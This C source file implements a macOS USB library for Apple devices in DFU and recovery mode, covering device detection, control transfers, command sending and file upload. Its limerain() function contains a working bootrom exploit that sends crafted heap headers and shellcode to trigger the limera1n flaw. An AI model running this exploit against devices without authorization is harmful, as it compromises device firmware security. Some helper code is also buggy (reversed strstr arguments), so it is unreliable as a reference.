//
//  libusbkit.c
//  libusbkit
//
//  Created by Steven De Franco on 2/7/13.
//  Copyright (c) 2013 iH8sn0w. All rights reserved.
//

#include <stdio.h>
#include "libusbkit.h"
#include "limerain.h"
//#include "IPhoneUSB.h"

/*
 
 changes by kevin: these probably could just be part of the struct for UKDevice, but whatever
 these static global variables are added so we can unregister for notifications easily
 
 */

static io_iterator_t			gAddedIter; //need different io iterators to keep track of devices getting attached and removed
static io_iterator_t            gRemovedIter;
static IONotificationPortRef	gNotifyPort; //our notification port keeping track of removing and adding devices.

void ioAsyncCallback(void *refcon, IOReturn result, void *arg0);
void ioAsyncCallback(void *refcon, IOReturn result, void *arg0) {
    
    
}

void _error(const char* string, IOReturn code);
void _error(const char* string, IOReturn code) {
    
    printf("[ERROR] %s failed with code 0x%04x\n", string, code );
}

UKDevice * init_libusbkit() {
    
    UKDevice * toReturn;
    
    toReturn = (UKDevice *) malloc(sizeof(UKDevice));
    
    toReturn->usbService =
    toReturn->interfaceIterator =
    toReturn->mode =
    toReturn->transaction = 0;
    toReturn->dev = NULL;
    toReturn->intf = NULL;
    toReturn->ctrlIn =
    toReturn->ctrlOut =
    toReturn->serialIn =
    toReturn->serialOut =
    toReturn->fileIn =
    toReturn->fileOut =
    toReturn->vid =
    toReturn->pid =
    toReturn->cpid =
    toReturn->bdid =
    toReturn->ecid =
    toReturn->locationID = -1;
    toReturn->opened =
    toReturn->enabled =
    toReturn->normalDevice = false;
    
    return toReturn;
}


//kind of a hack, doesn't care about any variables from UKDevice, just releases globals that UKDevice uses

void stop_notification_monitoring(UKDevice *Device) {
    
    IONotificationPortDestroy(gNotifyPort);
    
    if (gAddedIter)
    {
        IOObjectRelease(gAddedIter);
        gAddedIter = 0;
        IOObjectRelease(gRemovedIter);
        gRemovedIter = 0;
    }
    
}

void close_libusbkit(UKDevice* Device) {
    
    free(Device);
}

void add_devices(UKDevice * Device, int devices_array[2][2]) {
    
    int i;
    for (i = 0; i < 2; i++)
    {
        Device->eligibleDevices[i][0] = devices_array[i][0];
        Device->eligibleDevices[i][1] = devices_array[i][1];
    }

    
}

void register_for_usb_notifications(UKDevice * Device) {
    
    IOReturn 				ret;
	io_iterator_t           detachIterator, attachIterator;
    IONotificationPortRef   _notificationObject;
    CFRunLoopSourceRef      _notificationRunLoopSource;
    

    gNotifyPort = IONotificationPortCreate(kIOMasterPortDefault);
    
    _notificationRunLoopSource = IONotificationPortGetRunLoopSource(gNotifyPort);
    
    CFRunLoopAddSource(CFRunLoopGetCurrent(),
                       _notificationRunLoopSource,
                       kCFRunLoopDefaultMode);
    
    Device->ioKitNotificationPort = gNotifyPort;
    Device->notificationRunLoopSource = _notificationRunLoopSource;
    
    ret = IOServiceAddMatchingNotification(gNotifyPort,
                                           kIOTerminatedNotification,
                                           IOServiceMatching(kIOUSBDeviceClassName),
                                           device_detached,
                                           (void *)Device,
                                           &gRemovedIter);
    
    if (ret != 0) {
        
        _error("IOServiceAddMatchingNotification:kIOTerminatedNotification", ret);
    }
    
    else device_detached((void *)Device, gRemovedIter);
    
    ret = IOServiceAddMatchingNotification(gNotifyPort,
                                           kIOMatchedNotification,
                                           IOServiceMatching(kIOUSBDeviceClassName),
                                           device_attached,
                                           (void *)Device,
                                           &gAddedIter);
    
    if (ret != 0) {
        
        _error("IOServiceAddMatchingNotification:kIOMatchedNotification", ret);
    }
    
    else device_attached((void*)Device, gAddedIter);
                                           
    
}

void device_attached(void * refCon, io_iterator_t iterator) {
    
    io_service_t            usbDevice;
    IOReturn 				ret;
    IOCFPlugInInterface 	**pluginInterface = NULL;
    IOUSBDeviceInterface187 **_dev = NULL;
    UInt16 					vendorID;
    UInt16					productID;
    SInt32                  score;
    UInt32                  locationID;
    HRESULT result;
   
    
    UKDevice * Device = (UKDevice*)refCon;
    
    while ((usbDevice = IOIteratorNext(iterator))) {
        
        
        ret = IOCreatePlugInInterfaceForService(usbDevice,
                                               kIOUSBDeviceUserClientTypeID, kIOCFPlugInInterfaceID,
                                               &pluginInterface, &score);
        IOObjectRelease(usbDevice);
        
        if (ret != 0) {
            
            _error("IOCreatePlugInInterfaceForService", ret);
            return;
        }
       
        result = (*pluginInterface)->QueryInterface(pluginInterface,
                                           CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID),
                                           (LPVOID *)&_dev);
        
        (*pluginInterface)->Release(pluginInterface);
        
        if (result != 0) {
            
            _error("QueryInterface", ret);
            return;
        }
        
        (*_dev)->GetDeviceVendor(_dev, &vendorID);
        (*_dev)->GetDeviceProduct(_dev, &productID);
        (*_dev)->GetLocationID(_dev, &locationID);
        
        // look for eligible devices connected
        // to implement into a function later
        
        int i;
        for (i = 0; i < 2; i++)
        {
            if (Device->eligibleDevices[i][0] == vendorID && Device->eligibleDevices[i][1] == productID) {
                
                Device->enabled = true;
                Device->dev = _dev;
                Device->vid = vendorID;
                Device->pid = productID;
                Device->locationID = locationID;
                
                get_ids(Device);
                
                open_device(Device);
                
                if (Device->pid == 0x1227) open_interface(Device, 0, 0);
                else open_interface(Device, 1, 1);
                
                break;
            }
        }
        
        
    }
}

void device_detached(void *refCon, io_iterator_t iterator) {
    
    io_service_t            service;
    SInt32                  locationID;
    
    UKDevice * Device = (UKDevice *)refCon;
    
    while ((service = IOIteratorNext(iterator))) {
        
        CFMutableDictionaryRef properties;
        IORegistryEntryCreateCFProperties(service, &properties, kCFAllocatorDefault, 0);
        CFNumberRef _locationID = CFDictionaryGetValue((CFDictionaryRef)properties, CFSTR("locationID"));
        CFNumberGetValue(_locationID, kCFNumberSInt32Type, &locationID);
        CFRelease(properties);
        
        if (locationID == Device->locationID) {
            
            release_device(Device);
            
            printf("[DISCONNECTED]\n");
            
        }
        
        IOObjectRelease(service);
        
    }
}

void release_device(UKDevice * Device) {
    

    if (Device->intf) {
        
        (*Device->intf)->USBInterfaceClose(Device->intf);
        (*Device->intf)->Release(Device->intf);
    }
    
    if (Device->dev) {
        
        (*Device->dev)->USBDeviceClose(Device->dev);
        (*Device->dev)->Release(Device->dev);
    }
    
    if (Device->interfaceIterator) IOObjectRelease(Device->interfaceIterator);
    
    Device->usbService =
    Device->interfaceIterator =
    Device->mode =
    Device->transaction = 0;
    Device->dev = NULL;
    Device->intf = NULL;
    Device->ctrlIn =
    Device->ctrlOut =
    Device->serialIn =
    Device->serialOut =
    Device->fileIn =
    Device->fileOut =
    Device->vid =
    Device->pid =
    Device->cpid =
    Device->bdid =
    Device->ecid =
    Device->locationID = -1;
    Device->opened =
    Device->enabled = false;
    
}

void open_device(UKDevice * Device) {
    
    IOReturn 							ret;
	IOUSBConfigurationDescriptorPtr 	desc = NULL;
	CFRunLoopSourceRef 					source = NULL;
    io_iterator_t 						iterator;
	IOUSBFindInterfaceRequest			interfaceRequest;
	UInt8								configIndex;
        
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return;
        
    }
    
    configIndex = (Device->pid == 0x1227 || Device->pid == 0x1281) ? 0 : 2;
    
    ret = (*Device->dev)->USBDeviceOpen(Device->dev);
    
    if (ret != 0) {
        
        _error("USBDeviceOpen", ret);
        return;
    }
    
    ret = (*Device->dev)->CreateDeviceAsyncEventSource(Device->dev, &source);
    
    if (ret != 0) {
        
        _error("CreateDeviceAsyncEventSource", ret);
        return;
    }
    
    CFRunLoopAddSource(CFRunLoopGetCurrent(),
                       source,
                       kCFRunLoopDefaultMode);
    
    ret = (*Device->dev)->GetConfigurationDescriptorPtr(Device->dev,
                                                  configIndex,
                                                  &desc);
    
    if (ret != 0) {
        
        _error("GetConfigurationDescriptorPtr", ret);
        return;
    }
    
    ret = (*Device->dev)->SetConfiguration(Device->dev, desc->bConfigurationValue);
    
    if (ret != 0) {
        
        _error("SetConfiguration", ret);
        return;
    }
    
    interfaceRequest.bAlternateSetting
	= interfaceRequest.bInterfaceClass
	= interfaceRequest.bInterfaceProtocol
	= interfaceRequest.bInterfaceSubClass
	= kIOUSBFindInterfaceDontCare;
	
	ret = (*Device->dev)->CreateInterfaceIterator(Device->dev, &interfaceRequest, &iterator);
    
    if (ret != 0) {
        
        _error("CreateInterfaceIterator", ret);
        return;
    }
    
    Device->interfaceIterator = iterator;
    
}
void open_interface(UKDevice * Device, int interface, int alt_interface) {
    
    IOCFPlugInInterface            **iodev = NULL;
    IOUSBInterfaceInterface300     **_intf = NULL;
    io_service_t                   service;
    SInt32                         score;
    IOReturn                       ret;
    HRESULT                        result;
    int                            index = 0;
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return;
        
    }
    
    while ((service = IOIteratorNext(Device->interfaceIterator))) {
        
        if (index < interface) {
            
            index++;
            continue;
        }
        
        ret = IOCreatePlugInInterfaceForService(service,
                                                      kIOUSBInterfaceUserClientTypeID,
                                                      kIOCFPlugInInterfaceID,
                                                      &iodev,
                                                      &score);
        IOObjectRelease(service);
        
        if (ret != 0)
        {
            _error("IOCreatePlugInInterfaceForService", ret);
            return;
        }
        
        result = (*iodev)->QueryInterface(iodev,
                                          CFUUIDGetUUIDBytes(kIOUSBInterfaceInterfaceID),
                                          (LPVOID*)&_intf);
        
        (*iodev)->Release(iodev);
        
        if (result != 0)
        {
            _error("QueryInterface", result);
            return;
        }
        
        ret = (*_intf)->USBInterfaceOpen(_intf);
        
        if (ret != 0) {
            
            _error("USBInterfaceOpen", ret);
            return;
        }
        
        if (alt_interface != 0)
        {
            ret = (*_intf)->SetAlternateInterface(_intf, alt_interface);
            
            if (ret != 0)
            {
                _error("SetAlternateInterface", ret);
            }
        }
        
        if (Device->pid == 0x1281 || Device->pid == 0x1227) {
            
            Device->ctrlIn = 0;
            Device->ctrlOut = 0;
            
            if (Device->pid == 0x1281) {
                
                Device->serialIn = 1;
                Device->serialOut = 2;
            }
        }
        
        
        Device->intf = _intf;
        Device->opened = true;
        
        printf("[CONNECTED] VID: 0x%04x / PID: 0x%04x\n", Device->vid, Device->pid);
        /*
        if (Device->pid == 0x1227) [[IPhoneUSB sharedInstance] notifyDFUConnected];
        if (Device->pid == 0x1281) [[IPhoneUSB sharedInstance] notifyRecoveryConnected];
        */
        break;
        
    }
    

}

int normal_device_detected(UKDevice* Device, UInt16 vendorID, UInt16 productID) {
    
    int product_ids[] = {};
    
    if (vendorID == 0x5AC) {
        
        
        
    }
    
    return 1;
}

void get_ids(UKDevice* Device) {
    
    IOReturn ret;
	UInt8 index;
    size_t response_buffer_length = 0xFF;
    
    char * response_buffer = malloc(0xFF);
    
    (*Device->dev)->USBGetSerialNumberStringIndex(Device->dev, &index);
    
    ret = send_control_request(Device, 0x80, 0x6, (kUSBStringDesc << 8) | index, 0, response_buffer_length, response_buffer);
    
    if (ret != 0) {
        
        printf("send_control_request_failed!!!\n");
        reset_device(Device);
        //open_interface(Device, 0, 0);
        free(response_buffer);
        return;
    }
	
    size_t response_size = ((response_buffer[0] & 0xFF)-2)/2+1;
	char *serial = malloc(response_size);
	memset(serial, '\0', response_size);
	
	for (int i = 0; i < response_size-1; i++)
    {
        serial[i] = (unsigned char)response_buffer[2*i+2];
	}
    
    printf("get_ids buffer: '%s'\n", serial);
    
    char* cpid_string = strstr(serial, "CPID:");
    char* bdid_string = strstr(serial, "BDID:");
    char* ecid_string = strstr(serial, "ECID:");
    
    sscanf(cpid_string, "CPID:%x", &Device->cpid);
    sscanf(bdid_string, "BDID:%x", &Device->bdid);
    sscanf(ecid_string, "ECID:%qX", &Device->ecid);
    
    
    printf("CPID: %d\n", Device->cpid);
    printf("BDID: %d\n", Device->bdid);
    printf("ECID: 0x%qX\n", Device->ecid);
    
    
    free(serial);
    free(response_buffer);
}

int send_control_request(UKDevice * Device,
                             UInt8 bm_request_type,
                             UInt8 b_request,
                             UInt16 w_value,
                             UInt16 w_index,
                             UInt16 w_length,
                             void * p_data) {
    
    IOReturn ret;
    IOUSBDevRequest request;
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
        
    }
    
    bzero(&request, sizeof(request));
    
    
    request.bmRequestType = bm_request_type;
    request.bRequest = b_request;
    request.wValue = OSSwapLittleToHostInt16(w_value);
    request.wIndex = OSSwapLittleToHostInt16(w_index);
    request.wLength = OSSwapLittleToHostInt16(w_length);
    request.pData = p_data;
    
    ret = (*Device->dev)->DeviceRequest(Device->dev, &request);
    
    if (ret != 0) {
        
        _error("DeviceRequest", ret);
        return -1;
    }
    
    
    return 0;
}

int send_control_request_to(UKDevice * Device,
                            UInt8 bm_request_type,
                            UInt8 b_request,
                            UInt16 w_value,
                            UInt16 w_index,
                            UInt16 w_length,
                            void * p_data,
                            UInt32 timeout) {
    
    IOReturn ret;
    IOUSBDevRequestTO request;
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
        
    }
    
    bzero(&request, sizeof(request));
    
    request.bmRequestType = bm_request_type;
    request.bRequest = b_request;
    request.wValue = OSSwapLittleToHostInt16(w_value);
    request.wIndex = OSSwapLittleToHostInt16(w_index);
    request.wLength = OSSwapLittleToHostInt16(w_length);
    request.pData = p_data;
    request.noDataTimeout = timeout;
    request.completionTimeout = timeout;
    
    ret = (*Device->dev)->DeviceRequestTO(Device->dev, &request);
    
    if (ret != 0) {
        
        _error("DeviceRequestTO", ret);
        return -1;
    }
    
    
    return 0;
}

int send_control_request_async(UKDevice * Device,
                               UInt8 bm_request_type,
                               UInt8 b_request,
                               UInt16 w_value,
                               UInt16 w_index,
                               UInt16 w_length,
                               void * p_data) {
    
    IOReturn ret;
    IOUSBDevRequest request;
        
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
        
    }
    
    bzero(&request, sizeof(request));
    
    
    request.bmRequestType = bm_request_type;
    request.bRequest = b_request;
    request.wValue = OSSwapLittleToHostInt16(w_value);
    request.wIndex = OSSwapLittleToHostInt16(w_index);
    request.wLength = OSSwapLittleToHostInt16(w_length);
    request.pData = p_data;
    
    ret = (*Device->dev)->DeviceRequestAsync(Device->dev, &request, ioAsyncCallback, (void*)Device);
    
    if (ret != 0) {
        
        _error("DeviceRequestAsync", ret);
        return -1;
    }
    
    
    return 0;
}

int send_control_request_async_to(UKDevice * Device,
                                  UInt8 bm_request_type,
                                  UInt8 b_request,
                                  UInt16 w_value,
                                  UInt16 w_index,
                                  UInt16 w_length,
                                  void * p_data,
                                  UInt32 timeout) {
    
    IOReturn ret;
    IOUSBDevRequestTO request;
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
        
    }
    
    bzero(&request, sizeof(request));
    
    request.bmRequestType = bm_request_type;
    request.bRequest = b_request;
    request.wValue = OSSwapLittleToHostInt16(w_value);
    request.wIndex = OSSwapLittleToHostInt16(w_index);
    request.wLength = OSSwapLittleToHostInt16(w_length);
    request.pData = p_data;
    request.noDataTimeout = timeout;
    request.completionTimeout = timeout;
    
    ret = (*Device->dev)->DeviceRequestAsyncTO(Device->dev, &request, ioAsyncCallback, (void*)Device);
    
    if (ret != 0) {
        
        _error("DeviceRequestAsyncTO", ret);
        return -1;
    }
    
    
    return 0;
}

int write_serial(UKDevice * Device, void* buffer, UInt32 size) {
    
    IOReturn ret;
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
        
    }
    
    if (Device->intf == NULL) {
        
        printf("Device->intf == NULL\n");
        return -1;
        
    }
    
    ret = (*Device->intf)->WritePipe(Device->intf, Device->serialOut, buffer, size);
    
    if (ret !=0) {
        
        _error("WritePipe", ret);
    }
    
    return ret;
}

int send_command(UKDevice * Device, const char* command) {
    
    unsigned long length = strlen(command);
    int ret = -1;
	
    if (length >= 0x100) length = 0xFF;
	
    
	if (length > 0) {
        
		ret = send_control_request_to(Device, 0x40, 0, 0, 0, length+1, (unsigned char*)command, 1000);
	}

    
    return ret;
}

int get_env(UKDevice* Device, const char * variable) {
    
    int ret = -1;

    char command[256];
    memset(command, '\0', sizeof(command));
	snprintf(command, sizeof(command)-1, "getenv %s", variable);
    
    //ret
    send_command(Device, command);
    
    //if (ret != 0) return ret;
    
    char* response = (char*) malloc(0xFF);
    memset(response, '\0', 0xFF);
    
    ret = send_control_request_to(Device, 0xC0, 0, 0, 0, 0xFE, (unsigned char*)response, 1000);
    
    if (ret != 0) {
        
        free(response);
        return ret;
    }
    
    printf("get_env: %s\n", response);
    
    free(response);
    
    return ret;
}


char* dump_ifaith(UKDevice * Device, const char* filename) {
    
    FILE* fp;
    bool end = false;
    IOReturn ret;
    char* stringToReturn = "unknown";
    
    
    fp = fopen(filename, "ab+");
    
    do {
        
        IOUSBDevRequestTO request;
        char* response = (char*) malloc(0x8000);
        memset(response, '\0', 0x8000);
        
        
        bzero(&request, sizeof(request));
        
        request.bmRequestType = 0xC0;
        request.bRequest = 0;
        request.wValue = OSSwapLittleToHostInt16(0);
        request.wIndex = OSSwapLittleToHostInt16(0);
        request.wLength = OSSwapLittleToHostInt16(0x7FFF);
        request.pData = (unsigned char*)response;
        request.noDataTimeout = 1000;
        request.completionTimeout = 1000;
        
        ret = (*Device->dev)->DeviceRequestTO(Device->dev, &request);
        
        if (ret != 0) end = true;
        
        if (strstr("pending", response)) continue;
    
        if (strstr("ready", response)) {
            
            stringToReturn = response;
            continue;
        }
        
        if (strstr("failed", response)) {
            
            stringToReturn = response;
            return stringToReturn;
        }
        
        
        for (int i = 0; i < strlen(response); i+=2) {
        
            int *hex = calloc(3, 1);
            char tmpByte[3] = {'\0', '\0', '\0'};
            tmpByte[0] = response[i];
            tmpByte[1] = response[i+1];
            sscanf(tmpByte, "%x", hex);
            fwrite(hex, 2, 1, fp);
            free(hex);
        
        }
        
        free(response);
        
        
    } while (!end);
    
    fclose(fp);
    
    return stringToReturn;
    
}

int get_status(UKDevice * Device, unsigned int * status) {
    
    
    int ret = -1;
    unsigned char buffer[6];
    memset(buffer, '\0', 6);
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return ret;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return ret;
    }
    
    ret = send_control_request_to(Device, 0xA1, 3, 0, 0, 6, buffer, 1000);
    
    if (ret != 0) {
        
        *status = 0;
        return -1;
    }
    
    *status = (unsigned int) buffer[4];
    
    return 0;
}

int reset_counters(UKDevice * Device) {
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
    }
    
    if (Device->pid == 0x1227) {
        
        int ret = -1;
        ret = send_control_request_to(Device, 0x21, 4, 0, 0, 0, 0, 1000);
        return ret;
    }
    
    return -1;
    
}

int finish_transfer(UKDevice * Device) {
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
    }
    
    int i = 0;
	unsigned int status = 0;
    int ret;
    
    ret = send_control_request_to(Device, 0x21, 1, 0, 0, 0, 0, 1000);
    if (ret) return ret;
    
    for (i= 0; i < 3; i++) {
        
        get_status(Device, &status);
    }
    
    ret = reenumerate_device(Device);
    if (ret) return ret;
    
    return 0;
    
}

int abort_pipe_zero(UKDevice* Device) {
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
    }
    
    int ret = -1;
    
    ret = (*Device->dev)->USBDeviceAbortPipeZero(Device->dev);
    
    if (ret != 0) {
        
        _error("USBDeviceAbortPipeZero", ret);
    }
    
    return ret;
}

int reset_device(UKDevice * Device) {
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
    }
    
    int ret = -1;
    
    ret = (*Device->dev)->ResetDevice(Device->dev);
    
    if (ret != 0) {
        
        _error("ResetDevice", ret);
    }
    
    return ret;
    
}

// From MobileDevice.framework
// should always be used in DFU mode
int reenumerate_device(UKDevice *Device) {
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
    }
    
    int ret = -1;
    
    ret = (*Device->dev)->USBDeviceReEnumerate(Device->dev, 0);
    
    if (ret != 0) {
        
        _error("USBDeviceReEnumerate", ret);
    }
    
    return ret;
}

int limerain(UKDevice *Device, bool ifaith_mode) {
    
    unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = 0x24000;
	unsigned int stack_address = 0x84033F98;
	unsigned int shellcode_address = 0x84023001;
	unsigned int shellcode_length = 0;
    int ret;
    
    double progress= 0.0;
    
    if (Device->pid != 0x1227) return -1;
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return -1;
    }
    
	if (Device->cpid == 0x8930) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	}
	if (Device->cpid == 0x8920) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	}
    
	memset(shellcode, 0x0, 0x800);
    
    if (ifaith_mode) {
    
        shellcode_length = sizeof(limera1n_payload_ifaith);
        memcpy(shellcode, limera1n_payload_ifaith, shellcode_length);
    
    } else {
        
        shellcode_length = sizeof(limera1n_payload_dfu);
        memcpy(shellcode, limera1n_payload_dfu, shellcode_length);
        
    }
    
    printf("Resetting device counters\n");
    
    ret = reset_counters(Device);
    
    if (ret) return ret;
    
    memset(buf, 0xCC, 0x800);
	for(i = 0; i < 0x800; i += 0x40) {
		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}
    
    printf("Sending chunk headers\n");
    
    //[[IPhoneUSB sharedInstance] notifyUploadInProgress:progress];
    
    ret = send_control_request_to(Device, 0x21, 1, 0, 0, 0x800, buf, 1000); // 0x800
    if (ret) return ret;
    
    progress += (double)((0x800*100)/max_size);
   // [[IPhoneUSB sharedInstance] notifyUploadInProgress:progress];
    
    memset(buf, 0xCC, 0x800); // 0x22800
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		
        ret = send_control_request_to(Device, 0x21, 1, 0, 0, 0x800, buf, 1000);
        if (ret) return ret;
        progress += (double)((0x800*100)/max_size);
       // [[IPhoneUSB sharedInstance] notifyUploadInProgress:progress];
	}
    
    printf("Sending exploit payload\n");
    
    ret = send_control_request_to(Device, 0x21, 1, 0, 0, 0x800, shellcode, 1000); // 0x800
    if (ret) return ret;
    
    printf("Sending fake data\n");
    
    memset(buf, 0xBB, 0x800);
    
    ret = send_control_request_to(Device, 0xA1, 1, 0, 0, 0x800, buf, 1000); // 0x800
    if (ret) return ret;
    
    progress += (double)((0x800*100)/max_size);
    //[[IPhoneUSB sharedInstance] notifyUploadInProgress:progress];
    //
    send_control_request_async(Device, 0x21, 1, 0, 0, 0x800, buf); // 0x800
    
    
    
    usleep(10000);
    
    abort_pipe_zero(Device);
    //
    
    progress += (double)((0x800*100)/max_size);
    //[[IPhoneUSB sharedInstance] notifyUploadInProgress:progress];
    
    send_control_request_to(Device, 0x21, 2, 0, 0, 0, buf, 1000);
    
    ret = reset_device(Device);
    if (ret) return ret;
    ret = finish_transfer(Device);
    if (ret) return ret;
    
    return 0;
}

int send_data(UKDevice* Device, unsigned char* data, unsigned long length) {
    
    int         ret = -1;
    UInt32      data_size;
	UInt32      current_length = 0;
	UInt32      default_packet_size = 0x800;
    unsigned int status = 0;
    double progress = 0.0;
    
    Device->transaction = 0;
    
    if (Device->pid == 0x1227) {
        
       ret = get_status(Device, &status);
        if (ret) return ret;
    
    } else if (Device->pid == 0x1281) {
        
        //ret
       ret = send_control_request_to(Device, 0x41, 0, 0, 0, 0, NULL, 1000);
        if (ret) return ret;
    }
    
    while (current_length < length) {
        
        progress = (double)((current_length*100)/length);
        //[[IPhoneUSB sharedInstance] notifyUploadInProgress:progress];
        
        data_size = ((length - current_length) <= 0x7FF) ? ((unsigned int)length - current_length) : default_packet_size;
        
        if (Device->pid == 0x1227) {
            
            //ret
           ret = send_control_request_to(Device, 0x21, 1, Device->transaction, 0, data_size, data+current_length, 1000);
            if (ret) return ret;
            
            Device->transaction++;
            
        } else if (Device->pid == 0x1281) {
            
            //ret
            ret = write_serial(Device, data+current_length, data_size);
            if (ret) return ret;
        }
    
        current_length += data_size;
        
        //printf("%u / %lu\n", (unsigned int)current_length, length);
    }
    
    //[[IPhoneUSB sharedInstance] notifyUploadInProgress:100.0];
    
    if (Device->pid == 0x1227){
        
        ret = finish_transfer(Device);
        if (ret) return ret;
    }
    
    return ret;
    
}

int send_file(UKDevice * Device, const char * filename) {
    
    int ret = -1;
    
    if (!Device->opened) {
        
        printf("Device->opened == false\n");
        return ret;
    }
    
    if (!Device->enabled) {
        
        printf("Device->enabled == false\n");
        return ret;
    }
    
    if (Device->dev == NULL) {
        
        printf("Device->dev == NULL\n");
        return ret;
    }
    
    FILE* file = fopen(filename, "rb");
    
    if (file == NULL) return -1;
    
    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    char* data = (char*) malloc(length);
    
    if (data == NULL) {
        fclose(file);
        return ret;
    }
    
    long bytes = fread(data, 1, length, file);
    fclose(file);
    
    if (bytes != length) {
        free(data);
        return ret;
    }
    
    ret = send_data(Device, (unsigned char*)data, length);
    
    free(data);
    
    return ret;
}


